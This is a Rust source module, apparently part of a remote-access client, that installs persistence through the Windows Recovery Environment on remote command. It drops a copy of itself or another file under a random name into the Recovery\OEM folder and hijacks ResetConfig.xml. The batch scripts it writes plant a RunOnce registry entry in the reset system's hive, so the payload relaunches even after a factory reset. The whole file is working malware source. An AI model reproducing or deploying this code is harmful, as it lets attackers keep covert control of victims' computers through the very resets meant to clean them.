use std::{
    fs,
    path::{Path, PathBuf},
    time::Duration,
};

use crate::{
    commands::Ctx,
    protocol::{self},
};

fn system_drive() -> String {
    std::env::var("SystemDrive").unwrap_or_else(|_| "C:".to_owned())
}

fn oem_path() -> PathBuf {
    PathBuf::from(format!("{}\\Recovery\\OEM", system_drive()))
}

fn backup_path() -> PathBuf {
    oem_path().join("XRSBackupData")
}

fn reset_config_path() -> PathBuf {
    oem_path().join("ResetConfig.xml")
}

fn random_alphanumeric(length: usize) -> String {
    const CHARSET: &[u8] = b"ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789";
    let mut seed = std::time::SystemTime::now()
        .duration_since(std::time::UNIX_EPOCH)
        .unwrap_or_default()
        .subsec_nanos() as u64
        ^ (std::process::id() as u64) << 17;
    let mut output = String::with_capacity(length);
    for _ in 0..length {
        seed ^= seed >> 12;
        seed ^= seed << 25;
        seed ^= seed >> 27;
        let index = (seed.wrapping_mul(0x2545_f491_4f6c_dd1d) >> 33) as usize % CHARSET.len();
        output.push(CHARSET[index] as char);
    }
    output
}

fn payload_script(command: &str, key: &str) -> String {
    format!(
        "@echo off\n\
for /F \"tokens=1,2,3 delims= \" %%A in ('reg query \"HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\RecoveryEnvironment\" /v TargetOS') DO SET TARGETOS=%%C\n\
\n\
for /F \"tokens=1 delims=\\\" %%A in ('Echo %%TARGETOS%%') DO SET TARGETOSDRIVE=%%A\n\
\n\
reg load HKLM\\{key} %%TARGETOSDRIVE%%\\windows\\system32\\config\\SOFTWARE\n\
\n\
reg add HKLM\\{key}\\Microsoft\\Windows\\CurrentVersion\\RunOnce /v {key} /t REG_SZ /d \"{command}\"\n\
\n\
reg unload HKLM\\{key}\n"
    )
}

fn create_oem_environment() -> Result<(), String> {
    fs::create_dir_all(oem_path()).map_err(|error| format!("create OEM directory: {error}"))?;
    fs::create_dir_all(backup_path()).map_err(|error| format!("create backup directory: {error}"))?;
    Ok(())
}

fn backup_current_config(stub_name: &str) -> Result<(), String> {
    fs::write(backup_path().join("DELETEME"), stub_name).map_err(|error| error.to_string())?;
    let config = reset_config_path();
    if config.exists() {
        let data = fs::read(&config).map_err(|error| error.to_string())?;
        fs::write(backup_path().join("configBackup"), data).map_err(|error| error.to_string())?;
    }
    Ok(())
}

fn run_block(phase: &str, file: &str) -> String {
    format!(
        "  <Run Phase=\"{phase}\">\n    <Path>{file}</Path>\n    <Duration>1</Duration>\n  </Run>\n"
    )
}

fn extract_tag(block: &str, tag: &str) -> Option<String> {
    let open = format!("<{tag}>");
    let close = format!("</{tag}>");
    let start = block.find(&open)? + open.len();
    let end = block[start..].find(&close)? + start;
    Some(block[start..end].to_owned())
}

fn replace_phase(config: &str, phase: &str, new_file: &str) -> Option<(String, String)> {
    let marker = format!("Phase=\"{phase}\"");
    let marker_position = config.find(&marker)?;
    let run_start = config[..marker_position].rfind("<Run")?;
    let run_end = config[run_start..].find("</Run>")? + run_start + "</Run>".len();
    let block = &config[run_start..run_end];
    let old_path = extract_tag(block, "Path").unwrap_or_default();
    let old_param = extract_tag(block, "Param").unwrap_or_default();
    let mut additional = format!("\"%TARGETOSDRIVE%\\Recovery\\OEM\\{old_path}\"");
    if !old_param.is_empty() {
        additional.push(' ');
        additional.push_str(&old_param);
    }
    let replacement = run_block(phase, new_file);
    let mut updated = String::new();
    updated.push_str(&config[..run_start]);
    updated.push_str(&replacement);
    updated.push_str(&config[run_end..]);
    Some((updated, additional))
}

fn create_config(basic_file: &str, factory_file: &str) -> String {
    format!(
        "<?xml version=\"1.0\" encoding=\"utf-8\"?>\n<Reset>\n{}{}</Reset>\n",
        run_block("BasicReset_AfterImageApply", basic_file),
        run_block("FactoryReset_AfterImageApply", factory_file),
    )
}

fn install_persistence(stub: &Path, extension: &str) -> Result<(), String> {
    let _ = uninstall_persistence();
    create_oem_environment()?;
    let stub_name = format!("{}{}", random_alphanumeric(20), extension);
    let stub_path = oem_path().join(&stub_name);
    fs::copy(stub, &stub_path).map_err(|error| format!("write stub: {error}"))?;
    let key = random_alphanumeric(20);
    let command = format!("cmd.exe /c start %TARGETOSDRIVE%\\Recovery\\OEM\\{stub_name}");
    let payload = payload_script(&command, &key);
    let basic = format!("{}.bat", random_alphanumeric(20));
    let factory = format!("{}.bat", random_alphanumeric(20));
    backup_current_config(&stub_name)?;

    let config_path = reset_config_path();
    let (config, basic_additional, factory_additional) = if config_path.exists() {
        let existing = fs::read_to_string(&config_path).map_err(|error| error.to_string())?;
        let (after_basic, basic_additional) = match replace_phase(&existing, "BasicReset_AfterImageApply", &basic) {
            Some(result) => result,
            None => (existing.clone(), String::new()),
        };
        let (after_factory, factory_additional) = match replace_phase(&after_basic, "FactoryReset_AfterImageApply", &factory) {
            Some(result) => result,
            None => {
                let mut value = after_basic.clone();
                if let Some(position) = value.rfind("</Reset>") {
                    value.insert_str(position, &run_block("FactoryReset_AfterImageApply", &factory));
                }
                (value, String::new())
            }
        };
        let mut final_config = after_factory;
        if !final_config.contains("BasicReset_AfterImageApply") {
            if let Some(position) = final_config.rfind("</Reset>") {
                final_config.insert_str(position, &run_block("BasicReset_AfterImageApply", &basic));
            }
        }
        (final_config, basic_additional, factory_additional)
    } else {
        (
            create_config(&basic, &factory),
            String::new(),
            String::new(),
        )
    };
    fs::write(&config_path, config).map_err(|error| error.to_string())?;
    fs::write(oem_path().join(&basic), format!("{payload}{basic_additional}"))
        .map_err(|error| error.to_string())?;
    fs::write(oem_path().join(&factory), format!("{payload}{factory_additional}"))
        .map_err(|error| error.to_string())?;
    Ok(())
}

fn uninstall_persistence() -> Result<(), String> {
    if !backup_path().exists() {
        return Err("WinRE persistence not installed".to_owned());
    }
    fs::remove_dir_all(oem_path()).map_err(|error| format!("remove OEM directory: {error}"))
}

pub async fn handle(ctx: Ctx) {
    match ctx.command.name.as_str() {
        "winre_probe" => {
            if cfg!(windows) {
                ctx.out.result(&ctx.command, true, None).await;
            } else {
                ctx.out
                    .result(&ctx.command, false, Some("WinRE persistence is not enabled on this client"))
                    .await;
            }
        }
        "winre_install" => {
            #[cfg(windows)]
            {
                if !crate::win::is_admin() {
                    ctx.out
                        .result(&ctx.command, false, Some("WinRE persistence requires admin privileges"))
                        .await;
                    return;
                }
                let use_self = ctx.boolean_or("useSelf", false);
                let file_path = ctx.string("filePath").unwrap_or("").to_owned();
                let source = if use_self {
                    match std::env::current_exe() {
                        Ok(path) => path,
                        Err(error) => {
                            ctx.out
                                .result(&ctx.command, false, Some(&error.to_string()))
                                .await;
                            return;
                        }
                    }
                } else {
                    if file_path.is_empty() {
                        ctx.out
                            .result(&ctx.command, false, Some("missing filePath"))
                            .await;
                        return;
                    }
                    let path = PathBuf::from(&file_path);
                    if !path.exists() {
                        tokio::time::sleep(Duration::from_millis(500)).await;
                        if !path.exists() {
                            ctx.out
                                .result(&ctx.command, false, Some("file not found"))
                                .await;
                            return;
                        }
                    }
                    path
                };
                let extension = source
                    .extension()
                    .map(|value| format!(".{}", value.to_string_lossy()))
                    .unwrap_or_else(|| ".exe".to_owned());
                match install_persistence(&source, &extension) {
                    Ok(()) => ctx.out.result(&ctx.command, true, None).await,
                    Err(error) => ctx.out.result(&ctx.command, false, Some(&error)).await,
                }
            }
            #[cfg(not(windows))]
            {
                ctx.out
                    .result(&ctx.command, false, Some("WinRE persistence is not enabled on this client"))
                    .await;
            }
        }
        "winre_uninstall" => {
            #[cfg(windows)]
            {
                if !crate::win::is_admin() {
                    ctx.out
                        .result(&ctx.command, false, Some("WinRE uninstall requires admin privileges"))
                        .await;
                    return;
                }
                match uninstall_persistence() {
                    Ok(()) => ctx.out.result(&ctx.command, true, None).await,
                    Err(error) => ctx.out.result(&ctx.command, false, Some(&error)).await,
                }
            }
            #[cfg(not(windows))]
            {
                ctx.out
                    .result(&ctx.command, false, Some("WinRE persistence is not enabled on this client"))
                    .await;
            }
        }
        _ => {
            let _ = protocol::key_type();
        }
    }
}
